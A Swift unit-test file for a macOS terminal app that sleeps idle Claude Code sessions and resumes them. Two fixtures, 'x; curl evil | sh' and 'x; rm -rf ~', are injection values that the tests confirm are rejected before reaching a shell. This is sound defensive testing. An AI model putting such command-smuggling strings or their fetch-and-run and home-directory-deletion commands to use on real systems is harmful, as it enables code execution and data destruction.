import XCTest
@testable import Planchette

/// Idle Claude sessions go to sleep (SIGTERM) and wake with `claude --resume` (ClaudeSleep.swift).
final class ClaudeSleepTests: XCTestCase {
    private let now = Date(timeIntervalSince1970: 1_800_000_000)
    private let id = "1bfefa1f-0ce7-4817-89ea-53306d57130b"

    private func sleeps(
        _ setting: ClaudeSleep = .after2h, isClaude: Bool = true, live: Bool = true,
        state: AttentionState = .free, seen: Bool = true, idleHours: Double = 3,
        background: Bool = false, onScreen: Bool = false, claudeID: String? = "1bfefa1f-0ce7"
    ) -> Bool {
        ClaudeSleep.shouldSleep(
            setting: setting, isClaude: isClaude, agentLive: live, state: state, seen: seen,
            stateSince: now.addingTimeInterval(-idleHours * 3600), hasBackgroundWork: background,
            onScreen: onScreen, claudeSessionID: claudeID, now: now)
    }

    func testOffByDefaultAndSaved() throws {
        let old = try JSONDecoder().decode(PersistedState.self, from: Data("{}".utf8))
        XCTAssertEqual(old.claudeSleep, .off)
        var state = old
        state.claudeSleep = .after8h
        let back = try JSONDecoder().decode(PersistedState.self, from: JSONEncoder().encode(state))
        XCTAssertEqual(back.claudeSleep, .after8h)
        XCTAssertFalse(sleeps(.off))
    }

    func testAnIdleClaudeOffScreenSleeps() {
        XCTAssertTrue(sleeps())
        XCTAssertTrue(sleeps(state: .ready, seen: true), "a result you have seen")
        XCTAssertTrue(sleeps(.after24h, idleHours: 25))
    }

    func testNotBeforeItsTime() {
        XCTAssertFalse(sleeps(idleHours: 1.9))
        XCTAssertFalse(sleeps(.after8h, idleHours: 7))
    }

    // Anything you still have to look at, or anything at work, keeps it awake.
    func testWorkQuestionsAndUnreadResultsKeepItAwake() {
        XCTAssertFalse(sleeps(state: .running))
        XCTAssertFalse(sleeps(state: .waiting))
        XCTAssertFalse(sleeps(state: .error))
        XCTAssertFalse(sleeps(state: .ready, seen: false))
        XCTAssertFalse(sleeps(background: true), "a dev server or agent it runs in the background")
        XCTAssertFalse(sleeps(onScreen: true), "the terminal you left on screen")
    }

    func testOnlyALiveClaudeWithAWayBack() {
        XCTAssertFalse(sleeps(isClaude: false), "Codex, or a plain shell")
        XCTAssertFalse(sleeps(live: false), "nothing runs to end")
        XCTAssertFalse(sleeps(claudeID: nil), "no conversation to resume")
        XCTAssertFalse(sleeps(claudeID: "x; curl evil | sh"), "an id that may not go into a shell line")
    }

    func testASleepingTerminalIsSavedAndAnOldOneDecodes() throws {
        let json = #"{"id": "\#(UUID().uuidString)", "groupID": "\#(UUID().uuidString)", "workingDirectory": "/tmp"}"#
        let old = try JSONDecoder().decode(TerminalSession.self, from: Data(json.utf8))
        XCTAssertNil(old.sleepingClaudeID)
        var asleep = old
        asleep.sleepingClaudeID = id
        let back = try JSONDecoder().decode(TerminalSession.self, from: JSONEncoder().encode(asleep))
        XCTAssertEqual(back.sleepingClaudeID, id)
    }

    // The wake types the restore line: this conversation, then the picker, then a fresh Claude.
    func testTheWakeLineResumesThisConversation() {
        let line = RestoreCommand.input(
            hasScrollback: false, scrollbackPath: "", startupCommand: nil,
            claudeSessionID: id, resumeClaude: true, shell: "/bin/zsh")
        XCTAssertEqual(
            line, "claude --resume \(id) || [ $? -eq 143 ] || claude --resume || [ $? -eq 143 ] || claude\n")
    }

    // fish rejects a line with `$?` in it as a whole: nothing on it would run, no resume and no
    // wake. It names the status `$status`.
    func testFishGetsItsOwnStatusVariable() {
        let line = RestoreCommand.input(
            hasScrollback: false, scrollbackPath: "", startupCommand: nil,
            claudeSessionID: id, resumeClaude: true, shell: "/opt/homebrew/bin/fish")
        XCTAssertEqual(line, "claude --resume \(id) || test $status -eq 143 || claude --resume"
                       + " || test $status -eq 143 || claude\n")
        XCTAssertFalse(line?.contains("$?") ?? true)
        XCTAssertEqual(RestoreCommand.endedBySleep(shell: "/bin/bash"), "[ $? -eq 143 ]")
        XCTAssertEqual(RestoreCommand.endedBySleep(shell: nil), "[ $? -eq 143 ]")
    }

    // ⌃⌘T on a sleeping terminal: its Claude was ended by Planchette, so it comes back — with the
    // conversation the terminal kept.
    func testReopeningASleepingTerminalResumesItsConversation() {
        var session = TerminalSession(groupID: UUID(), workingDirectory: "/tmp")
        XCTAssertFalse(AppState.ClosedTerminal.claudeWasLive(session, agentLive: false))
        session.sleepingClaudeID = id
        XCTAssertTrue(AppState.ClosedTerminal.claudeWasLive(session, agentLive: false))
        XCTAssertEqual(AppState.ClosedTerminal(session: session, claudeWasLive: true).sleepingConversation, id)
        session.sleepingClaudeID = "x; rm -rf ~"
        XCTAssertNil(AppState.ClosedTerminal(session: session, claudeWasLive: true).sleepingConversation,
                     "never typed when it is not a plain id")
    }

    // The review's high finding: SIGTERM (exit 143) to the first Claude of the chain used to start
    // the picker and then a fresh Claude. Run the real line in zsh, with a stand-in `claude`.
    func testTheRestoreChainStopsWhenClaudeIsEndedBySleep() throws {
        let line = try XCTUnwrap(RestoreCommand.input(
            hasScrollback: false, scrollbackPath: "", startupCommand: nil,
            claudeSessionID: id, resumeClaude: true, shell: "/bin/zsh"))
        func run(firstExit: Int) throws -> String {
            let script = """
                calls=0
                claude() { calls=$((calls+1)); print -r -- "claude $*"; [[ $calls -eq 1 ]] && return \(firstExit); return 0; }
                \(line)
                """
            let process = Process()
            process.executableURL = URL(fileURLWithPath: "/bin/zsh")
            process.arguments = ["-f", "-c", script]
            let pipe = Pipe()
            process.standardOutput = pipe
            try process.run()
            process.waitUntilExit()
            return String(decoding: pipe.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)
        }
        XCTAssertEqual(try run(firstExit: 143), "claude --resume \(id)\n", "asleep: nothing more starts")
        XCTAssertEqual(try run(firstExit: 1), "claude --resume \(id)\nclaude --resume\n",
                       "a resume that failed still falls back to the picker")
    }

    // MARK: Finding the process

    func testClaudeIsTheNativeBinaryOrThePackageRunByNode() {
        XCTAssertTrue(ClaudeProcess.isClaude(["claude"]))
        XCTAssertTrue(ClaudeProcess.isClaude(["/Users/me/.local/bin/claude", "--resume", "x"]))
        XCTAssertTrue(ClaudeProcess.isClaude(["node", "/usr/local/lib/node_modules/@anthropic-ai/claude-code/cli.js"]))
        XCTAssertFalse(ClaudeProcess.isClaude(["node", "/Users/me/.npm/_npx/x/node_modules/.bin/playwright-mcp"]))
        XCTAssertFalse(ClaudeProcess.isClaude(["/bin/zsh", "-c", "claude"]), "a shell Claude started")
        XCTAssertFalse(ClaudeProcess.isClaude([]))
    }

    func testProcArgsSplitIntoArgumentsAndEnvironment() {
        var bytes: [UInt8] = [2, 0, 0, 0]
        bytes += Array("/usr/bin/claude".utf8) + [0, 0, 0]
        for text in ["claude", "--resume", "PLANCHETTE_SESSION=ABC", "HOME=/Users/me"] {
            bytes += Array(text.utf8) + [0]
        }
        bytes += [0, 0]
        let parsed = ClaudeProcess.parseProcArgs(bytes)
        XCTAssertEqual(parsed?.argv, ["claude", "--resume"])
        XCTAssertEqual(parsed?.env, ["PLANCHETTE_SESSION=ABC", "HOME=/Users/me"])
        XCTAssertNil(ClaudeProcess.parseProcArgs([1, 0]))
        XCTAssertNil(ClaudeProcess.parseProcArgs([3, 0, 0, 0] + Array("x".utf8) + [0, 0] + Array("a".utf8) + [0]))
    }

    // The native install runs a versioned file; the kernel names that process "2.1.323".
    func testTheExecutableFilterKnowsTheNativeInstall() {
        XCTAssertTrue(ClaudeProcess.mayBeClaude(executable: "/Users/me/.local/share/claude/versions/2.1.323"))
        XCTAssertTrue(ClaudeProcess.mayBeClaude(executable: "/opt/homebrew/bin/node"))
        XCTAssertTrue(ClaudeProcess.mayBeClaude(executable: "/usr/local/bin/claude"))
        XCTAssertFalse(ClaudeProcess.mayBeClaude(executable: "/bin/zsh"))
        XCTAssertFalse(ClaudeProcess.mayBeClaude(executable: "/opt/homebrew/bin/tmux"))
    }

    func testAnUnknownTerminalHasNoClaude() {
        XCTAssertTrue(ClaudeProcess.pids(forTerminal: UUID()).isEmpty)
    }

    // Read only: inside a Planchette terminal that runs Claude (as when Claude runs these tests),
    // the one Claude process of that terminal is found — and not its shells or MCP servers.
    func testTheClaudeOfThisTerminalIsFound() throws {
        guard let raw = ProcessInfo.processInfo.environment["PLANCHETTE_SESSION"],
              let terminal = UUID(uuidString: raw),
              ProcessInfo.processInfo.environment["CLAUDECODE"] != nil
        else { throw XCTSkip("not run by Claude inside a Planchette terminal") }
        let start = Date()
        let pids = ClaudeProcess.pids(forTerminal: terminal)
        XCTAssertEqual(pids.count, 1, "exactly this terminal's Claude: \(pids)")
        XCTAssertLessThan(Date().timeIntervalSince(start), 0.5, "one sweep of the process table")
    }

    func testTheSleepSpriteIsEightByEight() {
        XCTAssertEqual(StatePixels.asleep.count, StatePixels.size)
        XCTAssertTrue(StatePixels.asleep.allSatisfy { $0.count == StatePixels.size })
    }
}
